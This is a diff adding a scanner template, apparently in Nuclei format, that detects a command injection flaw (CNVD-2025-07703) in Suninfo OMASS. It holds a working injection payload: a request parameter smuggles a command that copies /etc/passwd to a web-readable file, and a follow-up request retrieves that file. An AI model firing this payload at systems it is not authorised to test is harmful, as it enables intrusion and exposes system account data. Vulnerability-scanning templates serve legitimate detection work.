@@ -1,0 +1,47 @@
+id: cnvd-2025-07703-command-injection
+info:
+  name: Suninfo OMASS Command Injection Vulnerability (CNVD-2025-07703)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection,CNVD-2025-07703
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+
+http:
+  - id: check-injection
+    method: GET
+    path:
+      - "{{BaseURL}}/api/imo.php?type=immediate&id=|cat%20/etc/passwd>{{t1}}.txt|"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "\"state\":\"true\""
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - id: verify-injection
+    method: GET
+    path:
+      - "{{BaseURL}}/api/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
